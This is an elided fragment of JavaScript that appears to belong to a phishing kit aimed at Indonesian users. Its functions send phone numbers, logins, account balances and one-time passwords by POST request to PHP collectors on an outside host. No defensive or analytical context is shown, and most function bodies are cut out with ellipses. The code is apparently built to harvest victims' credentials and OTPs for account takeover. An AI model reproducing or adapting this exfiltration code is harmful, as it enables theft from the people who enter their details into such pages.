function sendHp() {
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/akim/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/akim/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/akim/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/akim/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/akim/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/akim/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/akim/otpblm.php',
      type: 'POST',
